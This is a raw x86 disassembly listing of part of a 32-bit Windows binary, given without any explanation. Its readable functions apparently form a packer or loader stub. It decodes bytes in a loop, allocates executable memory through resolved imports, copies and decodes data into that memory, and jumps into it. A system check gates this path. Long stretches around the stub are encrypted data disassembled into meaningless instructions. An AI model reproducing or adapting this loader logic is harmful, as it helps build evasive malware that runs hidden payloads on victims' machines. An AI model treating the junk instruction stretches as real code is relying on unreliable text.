  421367:	neg    BYTE PTR [esi-0x38]
  42136a:	jmp    0xd9aacb08
  42136f:	lea    esi,[edx-0x21d74f45]
  421375:	xchg   BYTE PTR [esi-0x6d],ah
  421378:	sbb    si,0xe940
  42137d:	addr16 call 0xa2ce:0xb6043f13
  421385:	scas   al,BYTE PTR es:[edi]
  421386:	loope  0x4213b5
  421388:	jne    0x42132b
  42138a:	sbb    eax,0xc7384d06
  42138f:	nop
  421390:	mov    edx,0x3bc85cd0
  421395:	setne  BYTE PTR [edi-0x73]
  421399:	push   cs
  42139a:	mov    ds:0x83e27b2b,al
  42139f:	jmp    0x33c4be4
  4213a4:	push   esp
  4213a5:	jns    0x421355
  4213a7:	mul    BYTE PTR [eax]
  4213a9:	mov    ecx,0x3305bc51
  4213ae:	xchg   DWORD PTR [esi-0x4d335388],ebp
  4213b4:	retf   0x85e1
  4213b7:	imul   esp,DWORD PTR [ebx-0x8e5d4f6],0x8ced16bc
  4213c1:	or     cl,BYTE PTR [edi+0x60ce848f]
  4213c7:	mov    ebp,0x644db475
  4213cc:	addr16 mov bl,0xce
  4213cf:	xor    BYTE PTR [eax+eiz*4-0x78],0xf1
  4213d4:	or     ebx,DWORD PTR [edi-0x6ac339c0]
  4213da:	mov    ds:0x3f6ab8ea,eax
  4213df:	rcr    DWORD PTR [esi],cl
  4213e1:	adc    eax,0x50e5ce54
  4213e6:	aaa    
  4213e7:	pop    edx
  4213e8:	ficom  WORD PTR [edx+0x6d]
  4213eb:	cwde   
  4213ec:	and    DWORD PTR [ebp+0x57],0xe8af35cd
  4213f3:	cmp    BYTE PTR [esi+0x5b],dh
  4213f6:	out    0xc8,eax
  4213f8:	mov    esp,0x5ff5403d
  4213fd:	in     al,0xe8
  4213ff:	int    0x20
  421401:	jo     0x421421
  421403:	outs   dx,DWORD PTR ds:[esi]
  421404:	in     eax,dx
  421405:	mov    al,0x86
  421407:	inc    esp
  421408:	std    
  421409:	sti    
  42140a:	inc    eax
  42140b:	(bad)  
  42140c:	fcom   QWORD PTR [edx-0x6]
  42140f:	mov    eax,0xab061232
  421414:	push   es
  421415:	test   al,0xca
  421417:	cli    
  421418:	pop    DWORD PTR [ebp+eiz*2+0x5a3a4c19]
  42141f:	imul   ebp,DWORD PTR [ebp+0x4b6e987],0xe0d050bf
  421429:	and    dl,cl
  42142b:	nop
  42142c:	pusha  
  42142d:	xchg   edi,eax
  42142e:	shl    DWORD PTR [ecx+0x48],cl
  421431:	scas   al,BYTE PTR es:[edi]
  421432:	retf   
  421433:	sbb    al,0xf0
  421435:	sub    eax,0xe65009eb
  42143a:	cwde   
  42143b:	push   edx
  42143c:	scas   al,BYTE PTR es:[edi]
  42143d:	popa   
  42143e:	ss xor ch,bh
  421441:	aam    0xb4
  421443:	rol    dh,1
  421445:	stos   DWORD PTR es:[edi],eax
  421446:	repnz dec ecx
  421448:	loopne 0x42147b
  42144a:	mov    al,0x4
  42144c:	loopne 0x42149f
  42144e:	test   eax,0x78ac5358
  421453:	xchg   edi,eax
  421454:	dec    eax
  421455:	push   0x10
  421457:	test   eax,0xc363e2eb
  42145c:	mov    edx,DWORD PTR [edi+0x7140a145]
  421462:	out    0xb0,eax
  421464:	aam    0x76
  421466:	nop
  421467:	cli    
  421468:	fcom   DWORD PTR [ebx+0x719c7fd5]
  42146e:	dec    edi
  42146f:	(bad)  
  421470:	push   ebx
  421471:	dec    ebx
  421472:	mov    ds:0x70b472a7,eax
  421477:	xchg   esp,eax
  421478:	retf   0x44c1
  42147b:	arpl   WORD PTR [esi+0x75f435fc],cx
  421481:	sub    DWORD PTR [ebx+0x2ca912cb],0x93dcc401
  42148b:	pushf  
  42148c:	xchg   BYTE PTR [ecx+0x52],cl
  42148f:	into   
  421490:	rcl    DWORD PTR [edi+0x6],0x50
  421494:	cli    
  421495:	cmp    esp,ebx
  421497:	scas   al,BYTE PTR es:[edi]
  421498:	or     DWORD PTR [ebp+0x46f32ce0],0xffffff85
  42149f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214a0:	push   DWORD PTR [ebx-0x7fcf840a]
  4214a6:	mov    cl,0x7e
  4214a8:	out    dx,al
  4214a9:	cmp    eax,0xaafadf8b
  4214ae:	xlat   BYTE PTR ds:[ebx]
  4214af:	add    eax,0xdc66fe1e
  4214b4:	add    eax,0x96f9baae
  4214b9:	test   DWORD PTR [ecx+0x37a65171],edi
  4214bf:	push   esi
  4214c0:	arpl   WORD PTR [edx-0x46],bx
  4214c3:	mov    bh,0x73
  4214c5:	in     eax,0x93
  4214c7:	pusha  
  4214c8:	repnz xor eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0x18ecf20d
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x9809cc4f
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	(bad)  
  42182e:	cmp    ebp,DWORD PTR [esi-0x854d07a]
  421834:	test   al,0x77
  421836:	xchg   ecx,eax
  421837:	lock adc BYTE PTR [ebp+0x3f],0x89
  42183c:	hlt    
  42183d:	push   ss
  42183e:	xchg   edi,eax
  42183f:	test   al,0xf7
  421841:	test   al,0x77
  421843:	xchg   ebp,eax
  421844:	lock adc BYTE PTR ds:0x16f476c0,0x2f
  42184c:	test   al,0xf7
  42184e:	test   al,0x77
  421850:	xchg   ebp,eax
  421851:	lock adc BYTE PTR [ebp-0x40],0x76
  421856:	hlt    
  421857:	push   ss
  421858:	das    
  421859:	test   al,0xf7
  42185b:	test   al,0x77
  42185d:	xchg   ebp,eax
  42185e:	lock adc BYTE PTR [ebp-0x40],0x76
  421863:	hlt    
  421864:	push   ss
  421865:	das    
  421866:	test   al,0xf7
  421868:	test   al,0x77
  42186a:	ins    DWORD PTR es:[edi],dx
  42186b:	lock adc BYTE PTR [ebp-0x32],0x69
  421870:	dec    esi
  421871:	sbb    BYTE PTR [edi],ch
  421873:	sbb    al,0xfe
  421875:	gs push esi
  421877:	sub    eax,0xe198cef1
  42187c:	and    bl,BYTE PTR [edi+edi*2-0x257877a4]
  421883:	sbb    dl,dh
  421885:	and    bl,0x38
  421888:	loopne 0x42189f
  42188a:	xchg   ebp,eax
  42188b:	js     0x4218ce
  42188d:	mov    DWORD PTR [ebx-0x2f0fea78],0x56ae20f0
  421897:	popf   
  421898:	js     0x4218a9
  42189a:	in     al,dx
  42189b:	mov    eax,0x9ff857fb
  4218a0:	out    0x30,al
  4218a2:	out    dx,al
  4218a3:	jnp    0x42189e
  4218a5:	sbb    al,0xb
  4218a7:	test   al,0xf7
  4218a9:	test   al,0x77
  4218ab:	xchg   ebp,eax
  4218ac:	lock adc BYTE PTR [edx+0x59],0x8a
  4218b1:	lods   eax,DWORD PTR ds:[esi]
  4218b2:	push   ebp
  4218b3:	xlat   BYTE PTR ds:[ebx]
  4218b4:	cmp    bh,ch
  4218b6:	jmp    0x421847
  4218b8:	pop    es
  4218b9:	cli    
  4218ba:	shr    DWORD PTR [ebp+0x73ac7c52],0x23
  4218c1:	mov    ds:0x9fe550a8,al
  4218c6:	test   al,0xe7
  4218c8:	ins    DWORD PTR es:[edi],dx
  4218c9:	retf   0xcb4
  4218cc:	test   BYTE PTR ds:0x7d9192f0,ah
  4218d2:	std    
  4218d3:	or     BYTE PTR [eax],dl
  4218d5:	pop    edi
  4218d6:	in     al,dx
  4218d7:	clc    
  4218d8:	int    0x1c
  4218da:	imul   edx,DWORD PTR [eax+0x65],0xe1153da2
  4218e1:	mov    BYTE PTR [edi],bl
  4218e3:	cmp    ah,ah
  4218e5:	(bad)  
  4218e6:	pop    esp
  4218e7:	scas   eax,DWORD PTR es:[edi]
  4218e8:	test   eax,0x78ff0fd
  4218ed:	cli    
  4218ee:	shr    DWORD PTR [ebp-0x102383ad],0xbd
  4218f5:	mov    ds:0x9ff77048,al
  4218fa:	mov    ebp,0x2ecac77a
  4218ff:	xchg   ecx,eax
  421900:	sub    esp,DWORD PTR ds:0x7d3a0fa0
  421906:	int    0x95
  421908:	mov    bl,BYTE PTR [edi-0x7e]
  42190b:	mov    fs,WORD PTR [esi+0x1c]
  42190e:	ja     0x4218dd
  421910:	clc    
  421911:	mov    ds:0x88626d35,al
  421916:	pop    es
  421917:	test   eax,0xd7559c15
  42191c:	cmp    bh,ch
  42191e:	test   al,0x77
  421920:	xchg   ebp,eax
  421921:	lock adc BYTE PTR [ebp-0x40],0x76
  421926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421927:	push   ebx
  421928:	das    
  421929:	test   al,0xbb
  42192b:	test   eax,0x52509575
  421930:	ds (bad) 
  421932:	jbe    0x421928
  421934:	push   ss
  421935:	das    
  421936:	test   al,0xf7
  421938:	test   al,0x77
  42193a:	jne    0x42192c
  42193c:	adc    DWORD PTR [ebx+ecx*8+0x77],0x462f16fe
  421944:	repz test al,0x77
  421947:	sub    esi,esi
  421949:	adc    BYTE PTR [ebp-0x40],0x76
  42194d:	hlt    
  42194e:	pop    es
  42194f:	xchg   edx,eax
  421950:	test   al,0xf7
  421952:	test   al,0x67
  421954:	xchg   ebp,eax
  421955:	lock adc BYTE PTR [ebp-0x3b],0x76
  42195a:	hlt    
  42195b:	push   ss
  42195c:	outs   dx,BYTE PTR ds:[esi]
  42195d:	test   al,0xf7
  42195f:	mov    eax,0x80f09577
  421964:	push   ebp
  421965:	shl    BYTE PTR [ebx-0xc],0x17
  421969:	das    
  42196a:	test   al,0xf7
  42196c:	test   al,0x77
  42196e:	nop
  42196f:	lock adc DWORD PTR [ebp-0x40],0x76
  421974:	hlt    
  421975:	push   ss
  421976:	das    
  421977:	clc    
  421978:	sti    
  421979:	test   al,0x77
  42197b:	xchg   ecx,eax
  42197c:	lock adc BYTE PTR [esp+0x73],0xf4
  421982:	adc    al,0x2f
  421984:	test   al,0x77
  421986:	test   al,0x77
  421988:	test   eax,esi
  42198a:	add    BYTE PTR [ebp-0x40],0x76
  42198e:	hlt    
  42198f:	push   ss
  421990:	aas    
  421991:	test   al,0xf7
  421993:	mov    eax,0x82f09577
  421998:	push   ebp
  421999:	shl    BYTE PTR [esi-0xc],0x16
  42199d:	das    
  42199e:	test   al,0xf7
  4219a0:	test   al,0x77
  4219a2:	xchg   ebp,eax
  4219a3:	lock adc BYTE PTR [ebp+0x34],0x4f
  4219a8:	clc    
  4219a9:	push   ss
  4219aa:	inc    esi
  4219ab:	stos   DWORD PTR es:[edi],eax
  4219ac:	imul   DWORD PTR [eax-0x7d049a89]
  4219b2:	sbb    cl,BYTE PTR [ecx+0x2f16f476]
  4219b8:	test   al,0xf7
  4219ba:	test   al,0x77
  4219bc:	xchg   ebp,eax
  4219bd:	lock adc BYTE PTR [ebp-0x40],0x76
  4219c2:	hlt    
  4219c3:	push   ss
  4219c4:	das    
  4219c5:	test   al,0xf7
  4219c7:	test   al,0x77
  4219c9:	xchg   ebp,eax
  4219ca:	lock adc BYTE PTR [ebp-0x40],0x76
  4219cf:	hlt    
  4219d0:	push   ss
  4219d1:	das    
  4219d2:	test   al,0xf7
  4219d4:	test   al,0x77
  4219d6:	xchg   ebp,eax
  4219d7:	lock adc BYTE PTR [ebp-0x40],0x76
  4219dc:	hlt    
  4219dd:	push   ss
  4219de:	das    
  4219df:	test   al,0xf7
  4219e1:	test   al,0x77
  4219e3:	xchg   ebp,eax
  4219e4:	lock adc BYTE PTR [ebp-0x40],0x76
  4219e9:	hlt    
  4219ea:	push   ss
  4219eb:	das    
  4219ec:	test   al,0xf7
  4219ee:	test   al,0x77
  4219f0:	xchg   ebp,eax
  4219f1:	lock adc BYTE PTR [ebp-0x40],0x76
  4219f6:	hlt    
  4219f7:	push   ss
  4219f8:	das    
  4219f9:	test   al,0xf7
  4219fb:	test   al,0x77
  4219fd:	xchg   ebp,eax
  4219fe:	lock adc BYTE PTR [ebp-0x40],0x76
  421a03:	hlt    
  421a04:	push   ss
  421a05:	das    
  421a06:	test   al,0xf7
  421a08:	test   al,0x77
  421a0a:	xchg   ebp,eax
  421a0b:	lock adc BYTE PTR [ebp-0x40],0x76
  421a10:	hlt    
  421a11:	push   ss
  421a12:	das    
  421a13:	test   al,0xf7
  421a15:	test   al,0x77
  421a17:	xchg   ebp,eax
  421a18:	lock adc BYTE PTR [ebp-0x40],0x76
  421a1d:	hlt    
  421a1e:	cmp    BYTE PTR [ebx-0x33],bl
  421a21:	(bad)  
  421a22:	fdiv   QWORD PTR [edi-0x6b]
  421a25:	lock xor BYTE PTR [ebp+0x6f476cb],0x2f
  421a2d:	test   al,0xf7
  421a2f:	jl     0x421aa4
  421a31:	xchg   ebp,eax
  421a32:	lock xchg BYTE PTR [ebp-0x40],dl
  421a36:	es mov cl,0x55
  421a39:	sbb    eax,0x77a8b8fc
  421a3e:	xchg   ebp,eax
  421a3f:	lock adc BYTE PTR [ebp-0x20],0x76
  421a44:	hlt    
  421a45:	test   BYTE PTR [ecx],0xda
  421a48:	test   dl,bl
  421a4a:	adc    al,0x95
  421a4c:	lock adc BYTE PTR [ebp-0x60],0x76
  421a51:	hlt    
  421a52:	push   ss
  421a53:	fbld   TBYTE PTR [ebx-0x6ad25709]
  421a59:	lock or BYTE PTR [ebp+0x16f476c4],0x2f
  421a61:	test   al,0xf7
  421a63:	test   al,0x77
  421a65:	xchg   ebp,eax
  421a66:	lock adc BYTE PTR [ebp-0x40],0x56
  421a6b:	hlt    
  421a6c:	push   ss
  421a6d:	iret   
  421a6e:	test   al,0xf7
  421a70:	test   al,0x77
  421a72:	xchg   ebp,eax
  421a73:	lock adc BYTE PTR [ebp-0x40],0x76
  421a78:	hlt    
  421a79:	push   ss
  421a7a:	das    
  421a7b:	test   al,0xf7
  421a7d:	test   al,0x77
  421a7f:	xchg   ebp,eax
  421a80:	lock adc BYTE PTR [ebp-0x40],0x76
  421a85:	hlt    
  421a86:	push   ss
  421a87:	das    
  421a88:	test   al,0xf7
  421a8a:	test   al,0x77
  421a8c:	xchg   ebp,eax
  421a8d:	lock adc BYTE PTR [ebp-0x40],0x76
  421a92:	hlt    
  421a93:	push   ss
  421a94:	das    
  421a95:	test   al,0xf7
  421a97:	test   al,0x77
  421a99:	xchg   ebp,eax
  421a9a:	lock adc BYTE PTR [ebp-0x40],0x76
  421a9f:	hlt    
  421aa0:	push   ss
  421aa1:	das    
  421aa2:	test   al,0xf7
  421aa4:	test   al,0x77
  421aa6:	xchg   ebp,eax
  421aa7:	lock adc BYTE PTR [ebp-0x40],0x76
  421aac:	hlt    
  421aad:	push   ss
  421aae:	das    
  421aaf:	test   al,0xf7
  421ab1:	test   al,0x77
  421ab3:	xchg   ebp,eax
  421ab4:	lock adc BYTE PTR [ebp-0x40],0x76
  421ab9:	hlt    
  421aba:	push   ss
  421abb:	das    
  421abc:	test   al,0xf7
  421abe:	test   al,0x77
  421ac0:	xchg   ebp,eax
  421ac1:	lock adc BYTE PTR [ebp-0x40],0x76
  421ac6:	hlt    
  421ac7:	push   ss
  421ac8:	das    
  421ac9:	test   al,0xf7
  421acb:	test   al,0x77
  421acd:	xchg   ebp,eax
  421ace:	lock adc BYTE PTR [ebp-0x40],0x76
  421ad3:	hlt    
  421ad4:	push   ss
  421ad5:	das    
  421ad6:	test   al,0xf7
  421ad8:	test   al,0x77
  421ada:	xchg   ebp,eax
  421adb:	lock adc BYTE PTR [ebp-0x40],0x76
  421ae0:	hlt    
  421ae1:	push   ss
  421ae2:	das    
  421ae3:	test   al,0xf7
  421ae5:	test   al,0x77
  421ae7:	xchg   ebp,eax
  421ae8:	lock adc BYTE PTR [ebp-0x40],0x76
  421aed:	hlt    
  421aee:	push   ss
  421aef:	das    
  421af0:	test   al,0xf7
  421af2:	test   al,0x77
  421af4:	xchg   ebp,eax
  421af5:	lock adc BYTE PTR [ebp-0x40],0x76
  421afa:	hlt    
  421afb:	push   ss
  421afc:	das    
  421afd:	test   al,0xf7
  421aff:	test   al,0x77
  421b01:	xchg   ebp,eax
  421b02:	lock adc BYTE PTR [ebp-0x40],0x76
  421b07:	hlt    
  421b08:	push   ss
  421b09:	das    
  421b0a:	test   al,0xf7
  421b0c:	test   al,0x77
  421b0e:	xchg   ebp,eax
  421b0f:	lock adc BYTE PTR [ebp-0x40],0x76
  421b14:	hlt    
  421b15:	push   ss
  421b16:	das    
  421b17:	test   al,0xf7
  421b19:	test   al,0x77
  421b1b:	xchg   ebp,eax
  421b1c:	lock adc BYTE PTR [ebp-0x40],0x76
  421b21:	hlt    
  421b22:	push   ss
  421b23:	das    
  421b24:	test   al,0xf7
  421b26:	test   al,0x77
  421b28:	xchg   ebp,eax
  421b29:	lock adc BYTE PTR [ebp-0x40],0x76
  421b2e:	hlt    
  421b2f:	push   ss
  421b30:	das    
  421b31:	test   al,0xf7
  421b33:	test   al,0x77
  421b35:	xchg   ebp,eax
  421b36:	lock adc BYTE PTR [ebp-0x40],0x76
  421b3b:	hlt    
  421b3c:	push   ss
  421b3d:	das    
  421b3e:	test   al,0xf7
  421b40:	test   al,0x77
  421b42:	xchg   ebp,eax
  421b43:	lock adc BYTE PTR [ebp-0x40],0x76
  421b48:	hlt    
  421b49:	push   ss
  421b4a:	das    
  421b4b:	test   al,0xf7
  421b4d:	test   al,0x77
  421b4f:	xchg   ebp,eax
  421b50:	lock adc BYTE PTR [ebp-0x40],0x76
  421b55:	hlt    
  421b56:	push   ss
  421b57:	das    
  421b58:	test   al,0xf7
  421b5a:	test   al,0x77
  421b5c:	xchg   ebp,eax
  421b5d:	lock adc BYTE PTR [ebp-0x40],0x76
  421b62:	hlt    
  421b63:	push   ss
  421b64:	das    
  421b65:	test   al,0xf7
  421b67:	test   al,0x77
  421b69:	xchg   ebp,eax
  421b6a:	lock adc BYTE PTR [ebp-0x40],0x76
  421b6f:	hlt    
  421b70:	push   ss
  421b71:	das    
  421b72:	test   al,0xf7
  421b74:	test   al,0x77
  421b76:	xchg   ebp,eax
  421b77:	lock adc BYTE PTR [ebp-0x40],0x76
  421b7c:	hlt    
  421b7d:	push   ss
  421b7e:	das    
  421b7f:	test   al,0xf7
  421b81:	test   al,0x77
  421b83:	xchg   ebp,eax
  421b84:	lock adc BYTE PTR [ebp-0x40],0x76
  421b89:	hlt    
  421b8a:	push   ss
  421b8b:	das    
  421b8c:	test   al,0xf7
  421b8e:	test   al,0x77
  421b90:	xchg   ebp,eax
  421b91:	lock adc BYTE PTR [ebp-0x40],0x76
  421b96:	hlt    
  421b97:	push   ss
  421b98:	das    
  421b99:	test   al,0xf7
  421b9b:	test   al,0x77
  421b9d:	xchg   ebp,eax
  421b9e:	lock adc BYTE PTR [ebp-0x40],0x76
  421ba3:	hlt    
  421ba4:	push   ss
  421ba5:	das    
  421ba6:	test   al,0xf7
  421ba8:	test   al,0x77
  421baa:	xchg   ebp,eax
  421bab:	lock adc BYTE PTR [ebp-0x40],0x76
  421bb0:	hlt    
  421bb1:	push   ss
  421bb2:	das    
  421bb3:	test   al,0xf7
  421bb5:	test   al,0x77
  421bb7:	xchg   ebp,eax
  421bb8:	lock adc BYTE PTR [ebp-0x40],0x76
  421bbd:	hlt    
  421bbe:	push   ss
